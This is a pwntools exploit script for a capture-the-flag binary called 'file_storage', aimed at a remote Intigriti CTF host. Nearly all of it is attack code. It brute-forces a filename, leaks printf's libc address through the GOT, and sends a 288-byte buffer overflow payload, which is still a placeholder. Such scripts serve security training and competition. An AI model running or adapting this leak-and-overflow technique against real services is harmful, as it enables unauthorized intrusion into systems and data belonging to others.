from pwn import *
from time import time

# b *main+741
gs = '''
continue
'''

elf = context.binary = ELF("./file_storage_patched")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def force_brute_filename():
    io = start()
    for i in range(ord("A"), ord("Z") + 1):
        for j in range(ord("A"), ord("Z") + 1):
            io.sendlineafter("> ", b"1")
            filename = str()
            filename = chr(i) + chr(j) + ".txt"
            io.sendlineafter("Filename: ", filename)
            
            if b"What" in io.recv(4):
                io.close()
                return f"{chr(i)}{chr(j)}.txt"
    io.close()

context.terminal = ['gnome-terminal', '-e']

offset = 288

io = start()

io.sendlineafter("> ", b"2")
io.recv()
io.sendline(str(elf.got.printf).encode())

sleep(1)

io.close()

filename = force_brute_filename()
print(filename)

io = start()

io.sendlineafter("> ", b"1")

io.sendlineafter("Filename: ", filename.encode())
io.sendlineafter("What's in the file? (string/number): ", b"number")
leak_printf_libc =  u64(io.recvline().strip().ljust(8, b"\x00"))

print(f"Printf: {hex(leak_printf_libc)}")

io.sendlineafter("Do you want to write something? (yes/no): ", b"yes")
io.recv()

payload = b"".join([
    b"A"*offset,
    b"B"*8
    
])

io.send(payload)

io.interactive()